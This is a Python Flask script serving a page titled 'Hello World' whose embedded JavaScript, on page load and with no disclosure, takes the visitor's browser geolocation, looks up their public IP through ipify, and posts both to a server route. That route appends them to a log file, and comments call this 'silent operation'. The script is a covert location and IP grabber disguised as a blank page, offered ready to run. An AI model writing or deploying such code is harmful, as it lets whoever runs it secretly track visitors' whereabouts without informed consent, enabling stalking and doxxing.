from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    # Minimal HTML for silent operation
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hello World</title>
    </head>
    <body>
        <h1>Hello World</h1>
        <script>
            async function getUserIP() {
                // Fetch public IP address from a third-party service
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            }
            async function sendLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const ip = await getUserIP(); // Get user's public IP

                        // Send latitude, longitude, and IP to the server
                        fetch('/save_location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ latitude, longitude, ip })
                        });
                    });
                }
            }

            sendLocation(); // Execute location fetching and sending
        </script>
    </body>
    </html>
    """
    return html

@app.route('/save_location', methods=['POST'])
def save_location():
    data = request.get_json()

    # Get the IP address and geolocation data
    ip = data.get('ip')
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    # Save the data to a file
    with open('ips.txt', 'a') as file:
        file.write(f"{ip} ; {latitude} ; {longitude}\n")
    
    # No response to the client
    return '', 204

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=7878)
